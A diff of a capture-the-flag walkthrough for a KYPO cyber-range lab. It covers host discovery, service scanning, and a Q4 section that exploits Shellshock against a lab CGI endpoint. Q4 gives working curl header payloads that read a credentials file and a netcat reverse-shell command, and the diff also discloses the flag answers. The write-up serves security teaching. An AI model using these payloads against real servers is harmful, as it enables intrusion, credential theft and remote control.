@@ -76,9 +76,11 @@ The main learning objectives and techniques covered are summarized here:
 
 ### Challenge Q1: Network Probing (Target Discovery)
 
-**Objective:** From your Kali VM on the KYPO network, discover the hosts in the subnet and submit the *total number of IP addresses* (including your own) as the flag.
+**CTF Challenge Information** :
 
-**Question Tasks**: Before any penetration test (or detection/defense activity) you must know the network layout: which hosts exist, which IPs belong to the target subnet, and which node you are. That lets you focus scans responsibly and — from a defender’s perspective — quickly spot new or suspicious devices on the network.
+- **Objective:** From your Kali VM on the KYPO network, discover the hosts in the subnet and submit the *total number of IP addresses* (including your own) as the flag.
+- **Challenge Tasks**: Before any penetration test (or detection/defense activity) you must know the network layout: which hosts exist, which IPs belong to the target subnet, and which node you are. That lets you focus scans responsibly and — from a defender’s perspective — quickly spot new or suspicious devices on the network.
+- **Flag**: The total number of nodes' ip address (include yourself) in the sub-net.
 
 #### Step 1.1 - Get KYPO Environment SSH Access
 
@@ -140,7 +142,9 @@ The scanner output will list the IP addresses that responded. There are 4 node i
 
 ### Challenge Q2 : Target Service Scanning (Service Enumeration)
 
-**Objective:**  Determine **which services** are running on that host and — critically — to extract the **HTTP service version string**. Submit the flag under format `<service-name> httpd <version number> ((Debian))`
+**CTF Challenge Information** :
+
+- **Objective:**  Determine **which services** are running on that host and — critically — to extract the **HTTP service version string**. Submit the flag under format `<service-name> httpd <version number> ((Debian))`
 
 #### Step 2.1 - Nmap scan the target 
 
@@ -178,9 +182,11 @@ Fill in the result in the flag submission page:
 
 ### Challenge Q3 : Identify the Vulnerability
 
-**Objective:** Scan the discovered web service to identify known vulnerabilities and submit the CVE identifier found in an open vulnerability database.
+**CTF Challenge Information** :
 
-**Tasks**: Knowing the server software and version (from Q2) lets you search for known weaknesses. In this task we perform a focused web vulnerability scan against the Apache-hosted service to discover a concrete, public CVE that explains how the server can be exploited.
+- **Objective:** Scan the discovered web service to identify known vulnerabilities and submit the CVE identifier found in an open vulnerability database.
+- **Tasks**: Knowing the server software and version (from Q2) lets you search for known weaknesses. In this task we perform a focused web vulnerability scan against the Apache-hosted service to discover a concrete, public CVE that explains how the server can be exploited.
+- **Flag**: "CVE-xxxx-xxxx" recorded in the Open Sourced Vulnerability Database (OSVDB).
 
 #### Step 3.1 — Scan with Nikto (discover potential CVEs)
 
@@ -226,6 +232,87 @@ Fill in the flag in the submission page:
 ![](img/s_15.png)
 
 **The correct answer(flag) is**:  `CVE-2014-6271`
+
+
+
+------
+
+### Challenge Q4 : Exploit the Vulnerability
+
+**CTF Challenge Information** :
+
+- **Objective:** Understand how an attacker can use the discovered CVE to execute commands on a vulnerable web server.
+- **Tasks**: You have identified that the target web server (`10.32.51.173`) is running a CGI script vulnerable to **Shellshock**, , a Bash command-injection flaw. Your goal is to exploit that vulnerability to retrieve the password stored by the local user **michael** in a file named `credentials.txt`, then use that password to log in via SSH.
+- **Flag:** the password found in `credentials.txt` (i.e., the secret value you will later use to SSH as *michael*).
+
+#### Solution 4.1 (Optional): Enumerate directories using ffuf
+
+If the participants prefer not to rely on external CVE documentation, they can brute-force the web directory structure to find potentially exploitable endpoints.
+
+FFuF scan folders command:
+
+```bash
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.32.51.173/FUZZ -t 50
+```
+
+Result: 
+
+![](img/s_16.png)
+
+Then the participants need to try different wordlist in the `/usr/share/wordlists` folder and find the "cgi-bin", then find the "printenv". Then they can use curl to check: 
+
+![](img/s_17.png)
+
+#### Solution 4.2 (Recommended): Direct Shellshock exploitation using the known CVE
+
+Since Q3 confirmed Shellshock, students can directly craft injections to locate files on the server.
+
+Locate the credentials file using CVE-2014-6271 payload : 
+
+```
+curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'find / -type f -name credentials.txt'" \
+     http://10.32.51.173/cgi-bin/printenv
+```
+
+Result:
+
+![](img/s_18.png)
+
+The file is found at: `/var/www/html/credentials.txt`
+
+List and read the file with command : 
+
+```
+curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'ls /var/www/html'" http://10.32.51.173/cgi-bin/printenv
+
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /var/www/html/credentials.txt'" http://10.32.51.173/cgi-bin/printenv   
+```
+
+Result:
+
+![](img/s_19.png)
+
+#### **Solution 4.3 (Optional): Reverse shell via Netcat**
+
+If instructors want to teach reverse shells and post-exploitation techniques:
+
+Start listener on Kali:
+
+```
+nc -lvnp 4444
+```
+
+Trigger Shellshock with a reverse-shell payload:
+
+```
+curl -H "User-Agent: () { :;}; /bin/nc -e /bin/bash <KALI_IP> 4444" http://10.32.51.173/cgi-bin/printenv
+```
+
+After use test ssh login with the user `michael` and confirm the password correct fille, then submit the result (WindOfChange) below:
+
+![](img/s_20.png)
+
+**The correct answer(flag) is**:  `WindOfChange`
 
 
 
